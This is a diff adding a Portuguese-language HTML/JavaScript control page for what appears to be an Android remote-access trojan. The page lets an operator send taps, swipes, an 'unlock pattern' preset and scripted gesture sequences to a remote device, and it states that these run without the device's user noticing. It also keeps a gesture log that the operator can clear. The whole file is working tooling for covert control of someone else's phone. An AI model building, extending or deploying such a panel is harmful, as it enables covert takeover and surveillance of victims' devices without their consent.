@@ -1,0 +1,427 @@
+<div class="ui container segment">
+    <h3 class="ui header">Simulação de Gestos - Cliques Automáticos (CaaS)</h3>
+    <p>Controla o dispositivo remotamente executando gestos programados sem que o usuário perceba as interações.</p>
+
+    <div class="ui divider"></div>
+
+    <!-- Painel de Controle de Gestos -->
+    <div class="ui grid">
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h4>Executar Gestos</h4>
+                <p>Simule diferentes tipos de gestos no dispositivo.</p>
+
+                <div class="ui form">
+                    <!-- Tipo de Gesto -->
+                    <div class="field">
+                        <label>Tipo de Gesto</label>
+                        <select id="gestureType" class="ui dropdown">
+                            <option value="tap">Tap (Clique Simples)</option>
+                            <option value="long_tap">Long Tap (Toque Longo)</option>
+                            <option value="swipe">Swipe (Deslizar)</option>
+                        </select>
+                    </div>
+
+                    <!-- Coordenadas X, Y -->
+                    <div class="two fields">
+                        <div class="field">
+                            <label>Coordenada X</label>
+                            <input type="number" id="gestureX" placeholder="0" value="0" min="0">
+                        </div>
+                        <div class="field">
+                            <label>Coordenada Y</label>
+                            <input type="number" id="gestureY" placeholder="0" value="0" min="0">
+                        </div>
+                    </div>
+
+                    <!-- Duração (para Long Tap e Swipe) -->
+                    <div class="field">
+                        <label>Duração (ms)</label>
+                        <input type="number" id="gestureDuration" placeholder="500" value="500" min="100" max="5000">
+                    </div>
+
+                    <!-- Coordenadas Finais (para Swipe) -->
+                    <div id="swipeFields" style="display: none;">
+                        <div class="two fields">
+                            <div class="field">
+                                <label>Coordenada Final X</label>
+                                <input type="number" id="gestureEndX" placeholder="100" value="100" min="0">
+                            </div>
+                            <div class="field">
+                                <label>Coordenada Final Y</label>
+                                <input type="number" id="gestureEndY" placeholder="0" value="0" min="0">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="ui blue button" onclick="executeGesture()">
+                        <i class="play icon"></i>
+                        Executar Gesto
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h4>Guia Rápido</h4>
+                <div class="ui list">
+                    <div class="item">
+                        <i class="info icon"></i>
+                        <div class="content">
+                            <strong>Tap:</strong> Clique simples em uma coordenada
+                        </div>
+                    </div>
+                    <div class="item">
+                        <i class="info icon"></i>
+                        <div class="content">
+                            <strong>Long Tap:</strong> Toque longo (default 500ms)
+                        </div>
+                    </div>
+                    <div class="item">
+                        <i class="info icon"></i>
+                        <div class="content">
+                            <strong>Swipe:</strong> Deslizar de um ponto a outro
+                        </div>
+                    </div>
+                </div>
+
+                <h4 style="margin-top: 20px;">Dicas</h4>
+                <div class="ui list">
+                    <div class="item">
+                        <i class="circle info icon"></i>
+                        <div class="content">
+                            Resolução típica: 1080x2340
+                        </div>
+                    </div>
+                    <div class="item">
+                        <i class="circle info icon"></i>
+                        <div class="content">
+                            Centro da tela: ~540, 1170
+                        </div>
+                    </div>
+                    <div class="item">
+                        <i class="circle info icon"></i>
+                        <div class="content">
+                            Os gestos são invisíveis ao usuário
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <!-- Presets de Gestos Comuns -->
+    <div class="ui segment">
+        <h4>Presets de Gestos Comuns</h4>
+        <p>Executar gestos pré-configurados rapidamente.</p>
+
+        <div class="ui grid">
+            <div class="four wide column">
+                <button class="ui mini teal button fluid" onclick="executePreset('unlock_pattern')">
+                    <i class="lock open icon"></i>
+                    Simular Unlock Pattern
+                </button>
+            </div>
+
+            <div class="four wide column">
+                <button class="ui mini purple button fluid" onclick="executePreset('scroll_down')">
+                    <i class="arrow down icon"></i>
+                    Scroll Down
+                </button>
+            </div>
+
+            <div class="four wide column">
+                <button class="ui mini orange button fluid" onclick="executePreset('scroll_up')">
+                    <i class="arrow up icon"></i>
+                    Scroll Up
+                </button>
+            </div>
+
+            <div class="four wide column">
+                <button class="ui mini pink button fluid" onclick="executePreset('swipe_left')">
+                    <i class="arrow left icon"></i>
+                    Swipe Left
+                </button>
+            </div>
+
+            <div class="four wide column">
+                <button class="ui mini green button fluid" onclick="executePreset('swipe_right')">
+                    <i class="arrow right icon"></i>
+                    Swipe Right
+                </button>
+            </div>
+
+            <div class="four wide column">
+                <button class="ui mini blue button fluid" onclick="executePreset('home_button')">
+                    <i class="home icon"></i>
+                    Home Button
+                </button>
+            </div>
+
+            <div class="four wide column">
+                <button class="ui mini red button fluid" onclick="executePreset('back_button')">
+                    <i class="arrow left icon"></i>
+                    Back Button
+                </button>
+            </div>
+
+            <div class="four wide column">
+                <button class="ui mini yellow button fluid" onclick="executePreset('recent_apps')">
+                    <i class="square outline icon"></i>
+                    Recent Apps
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <!-- Recorder de Gestos -->
+    <div class="ui segment">
+        <h4>Sequência de Gestos Customizada</h4>
+        <p>Grave e execute uma sequência de gestos automaticamente.</p>
+
+        <div class="ui form">
+            <div class="field">
+                <label>Sequence (JSON)</label>
+                <textarea id="gestureSequence" rows="6" placeholder='[{"gestureType":"tap","x":540,"y":1170},{"gestureType":"long_tap","x":540,"y":1170,"duration":500}]'></textarea>
+            </div>
+
+            <button class="ui green button" onclick="executeSequence()">
+                <i class="play circle icon"></i>
+                Executar Sequência
+            </button>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <!-- Log de Gestos -->
+    <div class="ui segment">
+        <h4>Log de Gestos Executados</h4>
+        <p>Histórico de todos os gestos enviados ao dispositivo.</p>
+
+        <table class="ui celled table">
+            <thead>
+                <tr>
+                    <th>Tipo</th>
+                    <th>Coordenadas</th>
+                    <th>Duração</th>
+                    <th>Data/Hora</th>
+                    <th>Status</th>
+                    <th>Detalhes</th>
+                </tr>
+            </thead>
+            <tbody id="gestureLogTable">
+                <tr>
+                    <td colspan="6" style="text-align: center; color: #999;">
+                        <i class="spinner loading icon"></i>
+                        Carregando log...
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+
+        <button class="ui mini red button" onclick="clearGestureLog(this)" style="margin-top: 10px;">
+            <i class="trash icon"></i>
+            Limpar Log
+        </button>
+    </div>
+
+    <script>
+        // Setup ao iniciar
+        $(document).ready(function() {
+            $('.ui.dropdown').dropdown();
+            
+            loadGestureLog();
+            setInterval(loadGestureLog, 5000);
+
+            // Mostrar/ocultar campos de swipe
+            $('#gestureType').on('change', function() {
+                if ($(this).val() === 'swipe') {
+                    $('#swipeFields').show();
+                } else {
+                    $('#swipeFields').hide();
+                }
+            });
+        });
+
+        function getDeviceId() {
+            const match = window.location.pathname.match(/\/manage\/([^\/]+)/);
+            return match ? match[1] : '';
+        }
+
+        function executeGesture() {
+            const gestureType = $('#gestureType').val();
+            const x = parseInt($('#gestureX').val()) || 0;
+            const y = parseInt($('#gestureY').val()) || 0;
+            const duration = parseInt($('#gestureDuration').val()) || 500;
+            const endX = parseInt($('#gestureEndX').val());
+            const endY = parseInt($('#gestureEndY').val());
+
+            let url = `/manage/${getDeviceId()}/gs/${gestureType}`;
+            let data = { x, y, duration };
+
+            if (gestureType === 'swipe') {
+                data.endX = endX;
+                data.endY = endY;
+            }
+
+            $.post(url, data, function(response) {
+                if (response.error === false) {
+                    showNotification('#2ecc71', `${gestureType} executado com sucesso`);
+                    setTimeout(loadGestureLog, 500);
+                } else {
+                    showNotification('#f03434', response.error || 'Erro ao executar gesto');
+                }
+            }).fail(function() {
+                showNotification('#f03434', 'Erro ao conectar ao servidor');
+            });
+        }
+
+        function executePreset(preset) {
+            const presets = {
+                'unlock_pattern': [
+                    {gestureType: 'tap', x: 300, y: 600, duration: 0},
+                    {gestureType: 'swipe', x: 300, y: 600, endX: 700, endY: 900, duration: 300},
+                    {gestureType: 'tap', x: 700, y: 900, duration: 0}
+                ],
+                'scroll_down': [
+                    {gestureType: 'swipe', x: 540, y: 1000, endX: 540, endY: 300, duration: 500}
+                ],
+                'scroll_up': [
+                    {gestureType: 'swipe', x: 540, y: 300, endX: 540, endY: 1000, duration: 500}
+                ],
+                'swipe_left': [
+                    {gestureType: 'swipe', x: 800, y: 1170, endX: 100, endY: 1170, duration: 400}
+                ],
+                'swipe_right': [
+                    {gestureType: 'swipe', x: 100, y: 1170, endX: 800, endY: 1170, duration: 400}
+                ],
+                'home_button': [
+                    {gestureType: 'tap', x: 540, y: 2280, duration: 0}
+                ],
+                'back_button': [
+                    {gestureType: 'tap', x: 54, y: 2280, duration: 0}
+                ],
+                'recent_apps': [
+                    {gestureType: 'tap', x: 1026, y: 2280, duration: 0}
+                ]
+            };
+
+            const sequence = presets[preset];
+            if (sequence) {
+                $('#gestureSequence').val(JSON.stringify(sequence, null, 2));
+                executeSequence();
+            }
+        }
+
+        function executeSequence() {
+            try {
+                const sequence = JSON.parse($('#gestureSequence').val());
+                
+                if (!Array.isArray(sequence) || sequence.length === 0) {
+                    showNotification('#f03434', 'Sequência inválida');
+                    return;
+                }
+
+                let delay = 0;
+                sequence.forEach((gesture, index) => {
+                    setTimeout(() => {
+                        let url = `/manage/${getDeviceId()}/gs/${gesture.gestureType}`;
+                        $.post(url, gesture, function(response) {
+                            if (response.error === false) {
+                                console.log(`Gesto ${index + 1}/${sequence.length} executado`);
+                            }
+                        });
+                    }, delay);
+                    delay += (gesture.duration || 300) + 200; // 200ms entre gestos
+                });
+
+                showNotification('#2ecc71', `Sequência de ${sequence.length} gestos iniciada`);
+                setTimeout(loadGestureLog, 1000);
+            } catch (error) {
+                showNotification('#f03434', 'JSON inválido: ' + error.message);
+            }
+        }
+
+        function loadGestureLog() {
+            $.get(`/manage/${getDeviceId()}/gs/log`, function(data) {
+                if (data.error === false && data.data && data.data.gestureLog) {
+                    const gestureLog = data.data.gestureLog;
+                    
+                    if (gestureLog.length === 0) {
+                        $('#gestureLogTable').html(`
+                            <tr>
+                                <td colspan="6" style="text-align: center; color: #999;">
+                                    Nenhum gesto registrado
+                                </td>
+                            </tr>
+                        `);
+                        return;
+                    }
+
+                    let html = '';
+                    gestureLog.slice().reverse().forEach(log => {
+                        const statusIcon = log.success 
+                            ? '<i class="check icon" style="color: green;"></i> Sucesso'
+                            : '<i class="times icon" style="color: red;"></i> Erro';
+
+                        const timestamp = new Date(log.timestamp).toLocaleString('pt-BR');
+                        const coords = `(${log.x}, ${log.y})`;
+                        const swipeCoords = log.endX ? `→ (${log.endX}, ${log.endY})` : '';
+                        const coordText = coords + (swipeCoords ? ' ' + swipeCoords : '');
+
+                        html += `
+                            <tr>
+                                <td>${log.gestureType || '-'}</td>
+                                <td>${coordText}</td>
+                                <td>${log.duration}ms</td>
+                                <td>${timestamp}</td>
+                                <td>${statusIcon}</td>
+                                <td>${log.details || '-'}</td>
+                            </tr>
+                        `;
+                    });
+
+                    $('#gestureLogTable').html(html);
+                }
+            }).fail(function() {
+                $('#gestureLogTable').html(`
+                    <tr>
+                        <td colspan="6" style="text-align: center; color: #999;">
+                            Erro ao carregar log
+                        </td>
+                    </tr>
+                `);
+            });
+        }
+
+        function clearGestureLog(element) {
+            if (!confirm('Tem certeza que deseja limpar o log de gestos?')) return;
+
+            $(element).addClass('loading');
+            
+            $.ajax({
+                type: 'DELETE',
+                url: `/manage/${getDeviceId()}/gs/log`,
+                success: function(data) {
+                    if (data.error === false) {
+                        showNotification('#2ecc71', data.message);
+                        loadGestureLog();
+                    } else {
+                        showNotification('#f03434', data.error);
+                    }
+                    $(element).removeClass('loading');
+                },
+                error: function() {
+                    showNotification('#f03434', 'Erro ao limpar log');
+                    $(element).removeClass('loading');
+                }
+            });
+        }
+    </script>
+</div>
